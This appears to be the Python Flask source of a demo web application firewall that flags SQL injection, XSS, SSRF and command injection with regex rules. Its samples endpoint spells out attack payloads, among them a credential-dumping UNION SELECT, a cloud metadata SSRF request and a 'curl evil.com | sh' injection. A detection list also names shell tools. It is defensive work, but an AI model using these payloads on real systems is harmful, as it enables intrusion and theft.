from flask import Flask, request, jsonify, send_from_directory
import re
from urllib.parse import unquote_plus, urlparse

app = Flask(__name__, static_folder="static", static_url_path="")

SQLI_RULES = [
    {
        "id": "sqli_union_select",
        "regex": r"\bunion\b\s+\bselect\b",
        "reason": "UNION SELECT sequence",
    },
    {
        "id": "sqli_boolean_tautology",
        "regex": r"\bor\b\s+1\s*=\s*1\b",
        "reason": "Boolean tautology (or 1=1)",
    },
    {
        "id": "sqli_select_from",
        "regex": r"\bselect\b\s+.+\bfrom\b",
        "reason": "SELECT ... FROM pattern",
    },
    {
        "id": "sqli_comment",
        "regex": r"(--|/\*|\*/)",
        "reason": "SQL comment marker",
    },
    {
        "id": "sqli_time_delay",
        "regex": r"\b(waitfor\s+delay|sleep\s*\()",
        "reason": "Time delay function",
    },
]

XSS_RULES = [
    {
        "id": "xss_script_tag",
        "regex": r"<\s*script\b",
        "reason": "Script tag",
    },
    {
        "id": "xss_event_handler",
        "regex": r"on\w+\s*=",
        "reason": "Inline event handler",
    },
    {
        "id": "xss_js_scheme",
        "regex": r"javascript\s*:",
        "reason": "javascript: URI scheme",
    },
    {
        "id": "xss_img_onerror",
        "regex": r"<\s*img\b[^>]*onerror\s*=",
        "reason": "Image onerror handler",
    },
    {
        "id": "xss_svg_onload",
        "regex": r"<\s*svg\b[^>]*onload\s*=",
        "reason": "SVG onload handler",
    },
]

RCE_RULES = [
    {
        "id": "rce_shell_chain",
        "regex": r"(;|\|\||&&|\|)\s*",
        "reason": "Shell command chain operator",
    },
    {
        "id": "rce_substitution",
        "regex": r"(\$\([^\)]+\)|`[^`]+`)",
        "reason": "Command substitution",
    },
    {
        "id": "rce_suspicious_binary",
        "regex": r"\b(bash|sh|cmd\.exe|powershell|nc|netcat|curl|wget|python\s+-c|perl\s+-e|php\s+-r)\b",
        "reason": "Suspicious binary invocation",
    },
]

SSRF_SCHEMES = ["file", "gopher", "dict", "ftp", "smb", "ldap"]
URL_REGEX = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
SCHEME_REGEX = re.compile(r"\b(file|gopher|dict|ftp|smb|ldap)://", re.IGNORECASE)


def normalize(text: str) -> str:
    if not text:
        return ""
    value = text
    for _ in range(2):
        value = unquote_plus(value)
    return value


def clip(value: str, limit: int = 120) -> str:
    if len(value) <= limit:
        return value
    return value[: limit - 3] + "..."


def find_regex_evidence(rules, text: str):
    evidence = []
    for rule in rules:
        match = re.search(rule["regex"], text, flags=re.IGNORECASE | re.DOTALL)
        if match:
            evidence.append(
                {
                    "rule": rule["id"],
                    "match": clip(match.group(0)),
                    "reason": rule["reason"],
                }
            )
    return evidence


def is_internal_host(host: str) -> bool:
    if not host:
        return False
    host = host.lower()
    if host in {"localhost", "127.0.0.1", "0.0.0.0", "::1", "metadata"}:
        return True
    if host in {"metadata.google.internal", "host.docker.internal"}:
        return True
    if host.startswith("10.") or host.startswith("192.168.") or host.startswith("169.254."):
        return True
    if host.startswith("172."):
        parts = host.split(".")
        if len(parts) > 1:
            try:
                second = int(parts[1])
                if 16 <= second <= 31:
                    return True
            except ValueError:
                pass
    return False


def detect_ssrf(text: str):
    evidence = []
    for match in URL_REGEX.findall(text):
        try:
            parsed = urlparse(match)
            host = parsed.hostname
        except ValueError:
            host = None
        if host and is_internal_host(host):
            evidence.append(
                {
                    "rule": "ssrf_internal_host",
                    "match": clip(match),
                    "reason": f"Internal host target ({host})",
                }
            )
    for match in SCHEME_REGEX.findall(text):
        evidence.append(
            {
                "rule": "ssrf_unusual_scheme",
                "match": f"{match}://",
                "reason": "Unusual URL scheme",
            }
        )
    return evidence


def build_finding(name: str, evidence):
    score = min(1.0, 0.3 * len(evidence))
    if score >= 0.7:
        confidence = "high"
    elif score >= 0.4:
        confidence = "medium"
    else:
        confidence = "low"
    return {
        "attack": name,
        "score": round(score, 2),
        "confidence": confidence,
        "evidence": evidence,
    }


def analyze_payload(payload: str):
    normalized = normalize(payload)
    findings = []

    sqli_evidence = find_regex_evidence(SQLI_RULES, normalized)
    if sqli_evidence:
        findings.append(build_finding("SQLi", sqli_evidence))

    xss_evidence = find_regex_evidence(XSS_RULES, normalized)
    if xss_evidence:
        findings.append(build_finding("XSS", xss_evidence))

    ssrf_evidence = detect_ssrf(normalized)
    if ssrf_evidence:
        findings.append(build_finding("SSRF", ssrf_evidence))

    rce_evidence = find_regex_evidence(RCE_RULES, normalized)
    if rce_evidence:
        findings.append(build_finding("RCE", rce_evidence))

    summary = {
        "attack_detected": bool(findings),
        "top_attack": findings[0]["attack"] if findings else "None",
        "count": len(findings),
    }
    return {"summary": summary, "findings": findings}


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.route("/api/samples")
def samples():
    return jsonify(
        {
            "sqli": {
                "method": "GET",
                "url": "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "xss": {
                "method": "GET",
                "url": "https://shop.example.com/search?q=<script>alert(1)</script>",
                "headers": "User-Agent: CartierTest\nAccept: */*",
                "body": "",
            },
            "ssrf": {
                "method": "POST",
                "url": "https://shop.example.com/fetch",
                "headers": "Content-Type: application/json",
                "body": '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
            },
            "rce": {
                "method": "POST",
                "url": "https://shop.example.com/convert",
                "headers": "Content-Type: application/x-www-form-urlencoded",
                "body": "file=report.pdf;curl http://evil.com/s.sh|sh",
            },
        }
    )


@app.route("/api/analyze", methods=["POST", "OPTIONS"])
def analyze():
    if request.method == "OPTIONS":
        return ("", 204)
    data = request.get_json(silent=True) or {}
    method = data.get("method", "")
    url = data.get("url", "")
    headers = data.get("headers", "")
    body = data.get("body", "")
    payload = data.get("payload")
    if not payload:
        payload = f"{method} {url}\n{headers}\n\n{body}"
    result = analyze_payload(payload)
    return jsonify(result)


@app.route("/health")
def health():
    return jsonify({"status": "ok", "service": "cartier-waf"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
